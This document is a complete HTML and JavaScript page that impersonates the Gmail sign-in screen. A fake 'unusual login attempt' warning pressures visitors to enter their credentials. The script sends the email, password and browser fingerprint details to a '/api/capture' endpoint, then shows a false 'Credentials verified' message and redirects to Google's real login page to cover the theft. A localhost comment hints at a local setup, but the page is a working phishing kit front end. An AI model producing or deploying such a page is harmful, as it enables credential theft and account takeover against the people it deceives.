<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Gmail</title>
    <style>
        :root {
            --google-blue: #4285F4;
            --google-red: #EA4335;
            --google-yellow: #FBBC05;
            --google-green: #34A853;
            --text-primary: #202124;
            --text-secondary: #5f6368;
            --border-color: #dadce0;
            --bg-color: #f8f9fa;
            --error-color: #d93025;
            --success-color: #188038;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
        }

        body {
            font-family: 'Roboto', 'Arial', sans-serif;
            background-color: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            color: var(--text-primary);
        }

        /* Container */
        .login-container {
            background: white;
            padding: 0;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 420px;
            overflow: hidden;
            position: relative;
        }

        /* Header / Logo */
        .header {
            padding: 30px 40px 10px;
            text-align: center;
        }

        .logo {
            font-size: 28px;
            font-weight: 500;
            color: var(--text-primary);
            margin-bottom: 5px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
        }

        .logo-icon {
            width: 24px;
            height: 24px;
            fill: currentColor;
        }

        .logo-text {
            font-size: 24px;
        }
        .logo-text .g { color: var(--google-blue); }
        .logo-text .m { color: var(--google-red); }
        .logo-text .a { color: var(--google-yellow); }
        .logo-text .i { color: var(--google-green); }
        .logo-text .l { color: var(--google-blue); }

        .subtitle {
            font-size: 16px;
            color: var(--text-secondary);
            margin-bottom: 20px;
        }

        /* Alert Banner */
        .alert {
            background-color: #fff3cd;
            color: #856404;
            padding: 12px 16px;
            font-size: 13px;
            text-align: center;
            border-bottom: 1px solid #ffeeba;
            display: none; /* Hidden by default */
        }
        .alert.show { display: block; }
        .alert.success {
            background-color: #d1e7dd;
            color: #146c43;
            border-bottom-color: #badbcc;
        }

        /* Form Area */
        .form-area {
            padding: 30px 40px;
        }

        .input-group {
            margin-bottom: 20px;
        }

        .input-group label {
            display: block;
            margin-bottom: 8px;
            font-size: 14px;
            color: var(--text-secondary);
        }

        .input-group input {
            width: 100%;
            padding: 12px 14px;
            border: 1px solid var(--border-color);
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .input-group input:focus {
            border-color: var(--google-blue);
            box-shadow: 0 0 0 2px rgba(66, 133, 244, 0.1);
        }

        .input-group .error-text {
            color: var(--error-color);
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }

        .input-group.invalid input {
            border-color: var(--error-color);
        }
        .input-group.invalid .error-text {
            display: block;
        }

        /* Buttons */
        .btn-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-top: 10px;
        }

        .link {
            color: var(--google-blue);
            text-decoration: none;
            font-size: 14px;
            font-weight: 500;
        }
        .link:hover { text-decoration: underline; }

        .btn {
            background-color: var(--google-blue);
            color: white;
            border: none;
            border-radius: 4px;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: background-color 0.2s, opacity 0.2s;
        }

        .btn:hover {
            background-color: #3367d6;
        }
        
        .btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        /* Footer */
        .footer {
            text-align: center;
            padding: 20px;
            background-color: var(--bg-color);
            font-size: 12px;
            color: var(--text-secondary);
            border-top: 1px solid var(--border-color);
        }
        .footer a {
            color: var(--text-secondary);
            text-decoration: none;
            margin: 0 5px;
        }
        .footer a:hover { text-decoration: underline; }

        /* Spinner */
        .spinner {
            width: 16px;
            height: 16px;
            border: 2px solid transparent;
            border-top: 2px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            display: none;
            margin-right: 8px;
        }
        .btn.loading .spinner { display: inline-block; }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        /* Mobile Adjustments */
        @media (max-width: 480px) {
            .header, .form-area { padding: 20px; }
            .btn-row { flex-direction: column; gap: 15px; }
        }
    </style>
</head>
<body>

    <div class="login-container">
        <!-- Alert Banner -->
        <div id="alertBanner" class="alert">
            ⚠️ Security Alert: Unusual login attempt detected. Please verify your identity to prevent account suspension.
        </div>

        <!-- Header -->
        <div class="header">
            <div class="logo">
                <!-- Simple SVG Gmail Icon -->
                <svg class="logo-icon" viewBox="0 0 24 24">
                    <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4-8 5-8-5V6l8 5 8-5v2z"/>
                </svg>
                <span class="logo-text"><span class="g">G</span><span class="m">m</span><span class="a">a</span><span class="i">i</span><span class="l">l</span></span>
            </div>
            <div class="subtitle">Sign in</div>
        </div>

        <!-- Form -->
        <div class="form-area">
            <form id="loginForm" novalidate>
                <div class="input-group" id="emailGroup">
                    <label for="email">Email address</label>
                    <input type="email" id="email" name="email" placeholder="name@gmail.com" required autocomplete="username">
                    <span class="error-text">Please enter a valid email address.</span>
                </div>

                <div class="input-group" id="passwordGroup">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" placeholder="Password" required autocomplete="current-password">
                    <span class="error-text">Please enter your password.</span>
                </div>

                <div class="btn-row">
                    <a href="#" class="link" onclick="event.preventDefault(); alert('Forgot Password clicked (Fake)');">Forgot email?</a>
                    <button type="submit" class="btn" id="submitBtn">
                        <span class="spinner"></span>
                        <span class="btn-text">Next</span>
                    </button>
                </div>
            </form>
        </div>

        <!-- Footer -->
        <div class="footer">
            <p>Not your computer? Use Guest mode to sign in privately.</p>
            <div style="margin-top: 10px;">
                <a href="#">Help</a> |
                <a href="#">Privacy</a> |
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
<script>
document.getElementById('loginForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    const emailInput = document.getElementById('email');
    const passInput = document.getElementById('password');
    const btn = document.getElementById('submitBtn');
    const btnText = btn.querySelector('.btn-text');
    const alertBanner = document.getElementById('alertBanner');
    
    // Reset errors
    document.getElementById('emailGroup').classList.remove('invalid');
    document.getElementById('passwordGroup').classList.remove('invalid');
    alertBanner.classList.remove('show', 'success');

    // Basic Validation
    const email = emailInput.value.trim();
    const password = passInput.value.trim();
    let isValid = true;

    if (!email || !email.includes('@')) {
        document.getElementById('emailGroup').classList.add('invalid');
        isValid = false;
    }

    if (!password) {
        document.getElementById('passwordGroup').classList.add('invalid');
        isValid = false;
    }

    if (!isValid) return;

    // UI State: Loading
    btn.classList.add('loading');
    btn.disabled = true;
    btnText.textContent = 'Verifying...';

    // Prepare Data
    const payload = {
        email: email,
        password: password,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        referrer: document.referrer,
        language: navigator.language,
        screenResolution: `${screen.width}x${screen.height}`
    };

    // Send to Backend
    // Using 'same-origin' ensures it stays on localhost:3000
    fetch('/api/capture', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    })
    .then(response => {
        if (!response.ok) {
            throw new Error(`HTTP error! status: ${response.status}`);
        }
        return response.json();
    })
    .then(data => {
        // Success State
        alertBanner.innerHTML = '✅ Credentials verified. Redirecting to inbox...';
        alertBanner.classList.add('show', 'success');
        
        btnText.textContent = 'Success';

        // Redirect to Real Google Login after 3 seconds
        setTimeout(() => {
            window.location.href = 'https://accounts.google.com/v3/signin/identifier?hl=en&flowName=GlifWebSignIn';
        }, 3000);
    })
    .catch((error) => {
        console.error('Detailed Error:', error);
        
        // Error State - Show the actual error message for debugging
        alertBanner.innerHTML = `❌ Network Error: ${error.message}. Is the server running on port 3000?`;
        alertBanner.classList.add('show');
        
        // Reset Button
        btn.classList.remove('loading');
        btn.disabled = false;
        btnText.textContent = 'Next';
    });
});

// Add visual feedback on input
const inputs = document.querySelectorAll('input');
inputs.forEach(input => {
    input.addEventListener('input', function() {
        if (this.id === 'email') {
            document.getElementById('emailGroup').classList.remove('invalid');
        } else {
            document.getElementById('passwordGroup').classList.remove('invalid');
        }
    });
});
</script>
</body>
</html>
